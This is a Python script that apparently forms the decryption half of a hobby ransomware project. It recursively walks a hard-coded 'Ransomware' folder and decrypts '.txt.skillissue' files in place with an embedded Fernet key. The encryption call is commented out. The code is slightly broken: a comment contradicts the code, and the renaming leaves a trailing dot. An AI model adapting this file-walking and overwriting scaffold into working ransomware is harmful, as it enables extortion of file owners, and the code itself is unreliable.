import os
from pathlib import Path
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import filedialog

man_key = b'ex6N4o0hurcGMsqa3EsZ4XFce1NYBrL807tn94saoac='

def decrypt(dataFile, fernet_key):
    if dataFile.name.endswith('.txt.skillissue'):
        dataFile = Path(dataFile.path)  # Convert to a pathlib.Path object
        with open(dataFile, 'rb') as f:
            data = f.read()

        cipher_suite = Fernet(fernet_key)
        data = cipher_suite.decrypt(data)

        # Overwrite the existing .txt.skillissue file with the decrypted data and change the extension
        with open(dataFile, 'wb') as f:
            f.write(data)
        change_file_extension(dataFile, '')


def change_file_extension(file_path, new_extension):
    os.rename(file_path, os.path.splitext(file_path)[0] + f".{new_extension}")

def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        elif entry.is_dir():
            yield from scanRecurse(entry.path)

# Encrypt all files in the current directory and its subdirectories
directory = "C:/Users/Admin/Desktop/python/Ransomware/fernet"  # Change this to the directory containing the files to be encrypted
for item in scanRecurse(directory):
    # encrypt(item, symmetric_key)
    decrypt(item, man_key)

